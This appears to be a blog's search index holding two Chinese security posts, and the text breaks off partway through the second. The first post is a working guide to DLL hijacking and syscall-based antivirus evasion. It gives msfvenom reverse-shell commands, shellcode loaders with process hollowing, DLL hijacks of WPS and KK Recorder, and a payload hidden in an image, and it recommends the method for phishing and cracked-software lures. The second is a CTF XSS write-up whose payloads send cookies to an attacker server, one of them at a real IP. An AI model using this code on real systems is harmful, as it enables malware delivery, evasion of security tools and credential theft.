<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DLL劫持与Syscall免杀初尝试</title>
    <link href="/posts/facab1e5/"/>
    <url>/posts/facab1e5/</url>
    
    <content type="html"><![CDATA[<h1 id="DLL劫持与Syscall免杀初尝试"><a href="#DLL劫持与Syscall免杀初尝试" class="headerlink" title="DLL劫持与Syscall免杀初尝试"></a>DLL劫持与Syscall免杀初尝试</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="DLL劫持-语言-调用加载"><a href="#DLL劫持-语言-调用加载" class="headerlink" title="DLL劫持-语言-调用加载"></a>DLL劫持-语言-调用加载</h3><p>利用msf生产payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=ip <span class="hljs-attribute">lport</span>=port -f c<br></code></pre></td></tr></table></figure><p>Visual Studio创建动态链接库(DLL)项目</p><p><img src="/posts/facab1e5/image-20220828230121536-16616988835951-16616988857353.png" alt="image-20220828230121536"></p><p>项目生成的dllmain.cpp,pch.cpp重命名为dllmain.c,pch.c </p><p><img src="/posts/facab1e5/image-20220828231531280.png" alt="image-20220828231531280"></p><p>dllmain.c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<br><span class="hljs-comment">//msf生产payload</span><br><br><br><span class="hljs-type">int</span> main()<br>&#123;<br>    <span class="hljs-type">char</span>* Memory;<br>    Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    ((<span class="hljs-type">void</span>(*)())Memory)();<br>&#125;<br></code></pre></td></tr></table></figure><p>选择release生成解决方案<br>利用python调用dll文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#利用python载入dll文件</span><br>lib=CDLL(<span class="hljs-string">&#x27;Dll1&#x27;</span>)<br><span class="hljs-comment">#调用dll文件内置方法函数</span><br>lib.main()<br></code></pre></td></tr></table></figure><p>运行上线</p><h3 id="DLL劫持-白加黑-导入加载"><a href="#DLL劫持-白加黑-导入加载" class="headerlink" title="DLL劫持-白加黑-导入加载"></a>DLL劫持-白加黑-导入加载</h3><p>这里以kk录像机为例</p><p>启动kk录像机使用火绒剑进行分析</p><p><img src="/posts/facab1e5/image-20220829082438124.png" alt="image-20220829082438124"></p><p>可以看到kk录像机加载的dll文件,我们可以选择一个dll文件来进行劫持,尽量找文件较小的dll文件<br>这里选择libfontconfig-1.dll<br>接下来该构造一个dll了<br>和上文相同新建一个dll项目这次不用改后缀了<br>代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>HANDLE My_hThread = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <br><span class="hljs-comment">//CS生成32位shellcode</span><br>DWORD  WINAPI  <span class="hljs-built_in">ceshi</span>(LPVOID pParameter)<br>&#123;<br>    __asm<br>    &#123;<br>        mov eax, offset shellcode<br>        jmp eax<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<span class="hljs-comment">//初次调用dll时执行下面代码</span><br>        My_hThread = ::<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;ceshi, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//新建线程</span><br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:a<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">extern</span><span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a;<br>    a = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>x86生成<br>接下来利用Stud_PE来加载我们生成的dll<br>函数–右键add–选择生产的dll文件–选择函数test–添加到列表–添加<br>接下来将libfontconfig-1.dll以及我们生产的dll文件都拖到kk录像机安装目录<br>运行kk录像机成功上线但是对生产的dll文件依旧被杀<br>可以对shellcode利用aes或者xor混淆进一步处理</p><h3 id="C-amp-C-DLL劫持-白加黑-导出编译"><a href="#C-amp-C-DLL劫持-白加黑-导出编译" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-导出编译"></a>C&amp;C++-DLL劫持-白加黑-导出编译</h3><p>当遇到部分应用，对dll进行了防劫持的操作，上述方法失效时，可以使用导出编译<br>也就是把目标dll文件反编译然后做文章<br>这里使用wps中的et.exe劫持krpt.dll<br>利用工具Dependencies反编译dll文件<br><img src="/posts/facab1e5/image-20220829100942828.png" alt="image-20220829100942828"></p><p>和上文相同创建一个dll项目将反编译出来的文件拖入到项目文件夹,然后拖入到vs中<br>先修改.asm汇编文件删除所有jump语句<br>例如：<code>jmp pfnAL__krpt_RegisterWERHandler</code><br>接下来修改.asm的属性具体的修改方法会在.asm文件的前几行按照说法进行修改</p><p>注意配置和平台要和你要生成的结果一致</p><p><img src="/posts/facab1e5/image-20220829141832346.png" alt="image-20220829141832346"><br>先应用下面的才会出来<br><img src="/posts/facab1e5/image-20220829142012808.png" alt="image-20220829142012808"><br>接下来设置项目属性（注意平台以及配置要和你编译环境相同配置应该为release，平台x86就用win32 x64就用x64）<br><img src="/posts/facab1e5/image-20220829142733847.png" alt="image-20220829142733847"><br><img src="/posts/facab1e5/image-20220829142751524.png" alt="image-20220829142751524"></p><p>如果发生报错:LNK2026 模块对于 SAFESEH 映像是不安全的。<br>解决方法：<br>1.打开该项目的“属性页”对话框。<br>2.单击“链接器”文件夹。<br>3.单击“命令行”属性页。<br>4.将 &#x2F;SAFESEH:NO 键入“附加选项”框中，然后点击应用。</p><p>接下来要添加上线代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;krpt.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> hexData[] = <span class="hljs-comment">//填入shellcode</span><br><br><span class="hljs-type">char</span>* v7A = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, _countof(hexData), <span class="hljs-number">0x3000</span>u, <span class="hljs-number">0x40</span>u);<br><span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)v7A, hexData, _countof(hexData));<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PROCESS_INFORMATION</span> ProcessInformation;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">_STARTUPINFOA</span> StartupInfo;<br><span class="hljs-type">void</span>* v24;<br>CONTEXT Context;<br>DWORD DwWrite = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(StartupInfo));<br>StartupInfo.cb = <span class="hljs-number">68</span>;<br>BOOL result = <span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-number">0</span>, (LPSTR)<span class="hljs-string">&quot;rundll32.exe&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x44</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<br><span class="hljs-keyword">if</span> (result)<br>&#123;<br>Context.ContextFlags = <span class="hljs-number">65539</span>;<br><span class="hljs-built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);<br>v24 = <span class="hljs-built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="hljs-number">0</span>, _countof(hexData), <span class="hljs-number">0x1000</span>u, <span class="hljs-number">0x40</span>u);<br><span class="hljs-built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);<br>Context.Eip = (DWORD)v24;<br><span class="hljs-built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);<br><span class="hljs-built_in">ResumeThread</span>(ProcessInformation.hThread);<br><span class="hljs-built_in">CloseHandle</span>(ProcessInformation.hThread);<br>result = <span class="hljs-built_in">CloseHandle</span>(ProcessInformation.hProcess);<br>&#125;<br><br><br><span class="hljs-built_in">TerminateProcess</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), <span class="hljs-number">0</span>);<br>&#125;;<br><br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译生成dll命名为krpt.dll将原来的dll替换运行et.exe 成功上线</p><h3 id="C-amp-C-DLL劫持-白加黑-图片分离"><a href="#C-amp-C-DLL劫持-白加黑-图片分离" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-图片分离"></a>C&amp;C++-DLL劫持-白加黑-图片分离</h3><blockquote><p>由于dll并不免杀可以利用图片分离来进行免杀<br>利用项目:<a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a></p></blockquote><p>使用方法</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n2</span> dkmc.py<br></code></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">gen</span><br><span class="hljs-keyword">set</span> shellcode 这里是<span class="hljs-keyword">CS</span>的shellcode<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p>接下来修改dllmain.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_DEPRECATE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;krpt.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    &#123;<br>        FILE* fp;  <span class="hljs-comment">// 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义</span><br>        <span class="hljs-type">size_t</span> size;  <span class="hljs-comment">// 定义文件字节数变量size</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* buffer;  <span class="hljs-comment">// 定义缓存指针变量</span><br><br>        fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;shell.bmp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<span class="hljs-comment">//****修改为上方生成的图片****</span><br>        <span class="hljs-comment">// fseek()负号前移，正号后移</span><br>        <span class="hljs-built_in">fseek</span>(fp, <span class="hljs-number">0</span>, SEEK_END);          <span class="hljs-comment">// 文件指针指向文件末尾</span><br>        <span class="hljs-comment">// ftell()返回给定流 stream 的当前文件位置</span><br>        size = <span class="hljs-built_in">ftell</span>(fp);                <span class="hljs-comment">// size值为文件大小</span><br>        <span class="hljs-built_in">fseek</span>(fp, <span class="hljs-number">0</span>, SEEK_SET);          <span class="hljs-comment">// 文件指针指向文件开头</span><br>        buffer = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);    <span class="hljs-comment">// 动态申请图片大小的内存空间（数组指针）</span><br>        <span class="hljs-built_in">fread</span>(buffer, size, <span class="hljs-number">1</span>, fp);  <span class="hljs-comment">// 从fp读取和显示1个size大小的数据</span><br><br>        <span class="hljs-type">char</span>* v7A = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, size, <span class="hljs-number">0x3000</span>u, <span class="hljs-number">0x40</span>u);<br>        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)v7A, buffer, size);<br><br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PROCESS_INFORMATION</span> ProcessInformation;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_STARTUPINFOA</span> StartupInfo;<br>        <span class="hljs-type">void</span>* v24;<br>        CONTEXT Context;<br>        DWORD DwWrite = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(StartupInfo));<br>        StartupInfo.cb = <span class="hljs-number">68</span>;<br>        BOOL result = <span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-number">0</span>, (LPSTR)<span class="hljs-string">&quot;rundll32.exe&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x44</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            Context.ContextFlags = <span class="hljs-number">65539</span>;<br>            <span class="hljs-built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);<br>            v24 = <span class="hljs-built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="hljs-number">0</span>, size, <span class="hljs-number">0x1000</span>u, <span class="hljs-number">0x40</span>u);<br>            <span class="hljs-built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, size, &amp;DwWrite);<br>            Context.Eip = (DWORD)v24;<br>            <span class="hljs-built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);<br>            <span class="hljs-built_in">ResumeThread</span>(ProcessInformation.hThread);<br>            <span class="hljs-built_in">CloseHandle</span>(ProcessInformation.hThread);<br>            result = <span class="hljs-built_in">CloseHandle</span>(ProcessInformation.hProcess);<br>        &#125;<br><br><br>        <span class="hljs-built_in">TerminateProcess</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), <span class="hljs-number">0</span>);<br>    &#125;;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成dll重命名为krpt.dll 和生成图片一起拖入到et.exe文件夹 运行上线</p><p><strong>DLL劫持适用场景</strong><br>钓鱼，或给他人分享破解软件时 适用Dll劫持</p><h2 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h2><h3 id="Syscall底层-加载器生成-项目"><a href="#Syscall底层-加载器生成-项目" class="headerlink" title="Syscall底层-加载器生成-项目"></a>Syscall底层-加载器生成-项目</h3><blockquote><p>Windows下有两种处理器访问模式：用户模式（user mode）和内核模式（kernel mode）。用户模式下运行应用程序时，Windows 会为该程序创建一个新进程，提供一个私有虚拟地址空间和一个私有句柄表，因为私有，一个应用程序无法修改另一个应用程序的私有虚拟地址空间的数据；内核模式下，所有运行的代码都共享一个虚拟地址空间， 因此内核中驱动程序可能还会因为写入错误的地址空间导致其他驱动程序甚至系统出现错误。内核中包含了大部分操作系统的内部数据结构，所以用户模式下的应用程序在访问这些数据结构或调用内部Windows例程以执行特权操作的时候，必须先从用户模式切换到内核模式，这里就涉及到系统调用。</p></blockquote><blockquote><p>x86 windows 使用 sysenter 实现系统调用。<br>x64 windows 使用 syscall 实现系统调用。</p></blockquote><blockquote><p>参考链接:<br><a href="https://github.com/7BitsTeam/EDR-Bypass-demo">https://github.com/7BitsTeam/EDR-Bypass-demo</a><br><a href="https://github.com/icyguider/Shhhloader">https://github.com/icyguider/Shhhloader</a><br><a href="https://j00ru.vexillium.org/syscalls/nt/64/">https://j00ru.vexillium.org/syscalls/nt/64/</a><br><a href="https://cloud.tencent.com/developer/article/1944012">https://cloud.tencent.com/developer/article/1944012</a></p></blockquote><p>使用Syscall生成的exe文件 直接调用系统底层的函数依赖，完成上线<br>常规后门exe文件，需要调用很多系统自带的 dll 文件才能完成上线</p><p>这里利用EDR-Bypass-demo项目中的demo进行测试<br><strong>demo1</strong><br>CS生成raw的shellcode<br>使用enc.py进行加密(注意加密后要把末尾的&#x3D;&#x3D;换成@@)然后填入到demo1.cpp(chapter4-demo3下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">all</span>=f.read()<br>    array=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        array.append(i^<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#print(bytearray(array))</span><br>    <span class="hljs-built_in">print</span>(base64.b64encode(<span class="hljs-built_in">bytearray</span>(array)))<br></code></pre></td></tr></table></figure><p><strong>demo2</strong><br>EDR-Bypass-demo项目中的chapter4-demo4 直接改shellcode和上文相同 生成解决方法即可上线</p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow Web入门_XSS</title>
    <link href="/posts/1e1eb3c9/"/>
    <url>/posts/1e1eb3c9/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFShow-Web入门-XSS"><a href="#CTFShow-Web入门-XSS" class="headerlink" title="CTFShow Web入门_XSS"></a>CTFShow Web入门_XSS</h1><blockquote><p>参考:<a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p></blockquote><h2 id="Web316"><a href="#Web316" class="headerlink" title="Web316"></a>Web316</h2><blockquote><p>flag在cookie中</p></blockquote><p>可以利用xss平台或者使用自己服务器自己搭建一个写一个小脚本来获取cookie</p><p>服务器准备一个接受文件接受cookie get..php</p><p><a href="http://47.94.236.117/get.php?c=document.cookie">http://47.94.236.117/get.php?c=document.cookie</a></p><p>服务器脚本如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#get.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cookie</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$myfile</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;w+&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$cookie</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><blockquote><p>windows.location.href&#x3D;”&#x2F;url” 当前页面打开URL页面</p><p>document.cookie 获取cookie</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>查看服务器下的cookie.txt</p><p>即可发现falg</p><h2 id="Web317"><a href="#Web317" class="headerlink" title="Web317"></a>Web317</h2><p><code>&lt;script&gt;</code>被过滤换<code>&lt;body&gt;</code></p><blockquote><p>平台为机器人触发xss所以尽量选择不需要鼠标触发的事件</p></blockquote><blockquote><p>onload为载入事件 不需要鼠标移动直接触发</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">window.location.href</span>=<span class="hljs-string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="hljs-attr">document.cookie</span>;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Web318"><a href="#Web318" class="headerlink" title="Web318"></a>Web318</h2><p>这次过滤了<code>&lt;img&gt;</code>换<code>&lt;svg&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://ip/get.php?c=&#x27;+document.cookie;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Web319"><a href="#Web319" class="headerlink" title="Web319"></a>Web319</h2><p>同Web318</p><h2 id="Web320"><a href="#Web320" class="headerlink" title="Web320"></a>Web320</h2><p>过滤了<code>空格</code>利用<code>/</code>绕过</p><figure class="highlight html"><table><tr><td 